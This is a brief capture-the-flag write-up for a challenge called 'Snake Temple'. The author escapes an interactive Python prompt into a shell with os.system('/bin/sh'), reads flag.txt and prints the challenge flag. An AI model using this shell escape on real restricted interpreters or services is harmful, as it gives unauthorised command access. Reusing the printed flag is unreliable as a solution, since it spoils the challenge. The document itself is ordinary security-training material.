# Snake Temple writeup
It's an interactive python. Let's try to get a shell with the `system` library:

```python
>>> from os import system
>>> system("/bin/sh")
```

And it works!

```bash
$ ls
flag.txt
runner.sh
$ cat flag.txt
li2CTF{5N4K3_15_4N_1nflu3n714l__Cr347ur3}
```

Flag: `li2CTF{5N4K3_15_4N_1nflu3n714l__Cr347ur3}`
